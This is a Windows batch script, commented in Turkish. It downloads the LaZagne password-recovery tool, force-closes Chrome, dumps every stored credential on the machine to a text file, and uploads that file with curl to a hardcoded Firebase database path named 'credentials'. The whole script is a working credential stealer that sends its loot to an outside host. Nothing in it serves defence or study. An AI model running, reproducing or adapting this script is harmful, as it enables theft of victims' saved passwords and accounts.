@echo off
setlocal enabledelayedexpansion

:: Ayarlar
set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_BASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "LOG_FILE=%TEMP%\lazagne_script_log.txt"

:: Log dosyasını temizle ve başlangıç mesajını ekle
echo ------------------------------------------------------------ > "%LOG_FILE%"
echo [INFO] Script basladi: %DATE% %TIME% >> "%LOG_FILE%"
echo ------------------------------------------------------------ >> "%LOG_FILE%"

echo ------------------------------------------------------------
echo [INFO] Script basladi: %DATE% %TIME%
echo ------------------------------------------------------------

:: Lazagne.exe yoksa indir
if not exist "%LAZ_EXE%" (
    echo [INFO] Lazagne.exe bulunamadi, indiriliyor... >> "%LOG_FILE%"
    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
    if errorlevel 1 (
        echo [ERROR] Lazagne indirilemedi! >> "%LOG_FILE%"
        pause
        exit /b 1
    )
    echo [OK] Lazagne indirildi. >> "%LOG_FILE%"
) else (
    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor. >> "%LOG_FILE%"
)

:: Chrome varsa kapat
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if errorlevel 1 (
    echo [INFO] Chrome acik degil. >> "%LOG_FILE%"
) else (
    echo [INFO] Chrome calisiyor, kapatiliyor... >> "%LOG_FILE%"
    taskkill /IM chrome.exe /F >nul 2>&1
    if errorlevel 1 (
        echo [WARN] Chrome kapatilamadi. >> "%LOG_FILE%"
    ) else (
        echo [OK] Chrome kapatildi. >> "%LOG_FILE%"
    )
)

:: Sonuç klasörünü oluştur
if not exist "%RESULT_DIR%" (
    echo [INFO] Sonuc klasoru olusturuluyor... >> "%LOG_FILE%"
    mkdir "%RESULT_DIR%"
    if errorlevel 1 (
        echo [ERROR] Sonuc klasoru olusturulamadi! >> "%LOG_FILE%"
        pause
        exit /b 1
    )
)
echo [OK] Sonuc klasoru: %RESULT_DIR% >> "%LOG_FILE%"

:: Kod sayfasını UTF-8 olarak ayarla
chcp 65001 >nul
echo [INFO] Kod sayfasi UTF-8 olarak ayarlandi. >> "%LOG_FILE%"

:: LaZagne ile tüm credential’ları topla
if not exist "%LAZ_EXE%" (
    echo [ERROR] Lazagne.exe bulunamadi! >> "%LOG_FILE%"
    pause
    exit /b 1
)
echo [INFO] LaZagne calistiriliyor... >> "%LOG_FILE%"
echo Running: "%LAZ_EXE%" all -oN -output "%RESULT_DIR%" >> "%LOG_FILE%"
"%LAZ_EXE%" all -oN -output "%RESULT_DIR%" >nul 2>&1
if errorlevel 1 (
    echo [ERROR] LaZagne calistirilirken hata olustu. >> "%LOG_FILE%"
) else (
    echo [OK] LaZagne calistirildi. >> "%LOG_FILE%"
)

:: En son oluşturulan .txt dosyasını bul
set "RESULT_FILE="
for /f "delims=" %%i in ('dir "%RESULT_DIR%\*.txt" /b /od 2^>nul') do (
    set "RESULT_FILE=%%i"
)
if not defined RESULT_FILE (
    echo [ERROR] Sonuc dosyasi bulunamadi! >> "%LOG_FILE%"
    pause
    exit /b 1
)
echo [OK] Sonuc dosyasi bulundu: %RESULT_DIR%\!RESULT_FILE! >> "%LOG_FILE%"

:: Zaman damgası oluştur (örnek: 20250614_192345)
set "TIMESTAMP=%DATE:~-4%%DATE:~3,2%%DATE:~0,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
set "TIMESTAMP=!TIMESTAMP: =0!"
echo [DEBUG] TIMESTAMP: !TIMESTAMP! >> "%LOG_FILE%"

:: Firebase URL'yi hazırla
set "FIREBASE_URL=%FIREBASE_BASE_URL%/uploads/!TIMESTAMP!"
echo [DEBUG] Firebase URL: %FIREBASE_URL%.json >> "%LOG_FILE%"

:: Sonuçları Firebase'e yükle (curl ile)
echo [INFO] Sonuclar Firebase'e yukleniyor... >> "%LOG_FILE%"
set "FULL_PATH=%RESULT_DIR%\!RESULT_FILE!"
curl.exe -X PUT -d @"%FULL_PATH%" "%FIREBASE_URL%.json" --silent --show-error
if errorlevel 1 (
    echo [ERROR] !RESULT_FILE! yuklenemedi! >> "%LOG_FILE%"
    echo [DEBUG] Kullanilan URL: %FIREBASE_URL%/!RESULT_FILE!.json >> "%LOG_FILE%"
    pause
    exit /b 1
) else (
    echo [OK] !RESULT_FILE! yuklendi. >> "%LOG_FILE%"
)

echo ------------------------------------------------------------
echo [INFO] Tum islem tamamlandi: %DATE% %TIME% >> "%LOG_FILE%"
echo ------------------------------------------------------------
echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
echo Cikmak icin bir tusa basin...
pause >nul
exit /b 0
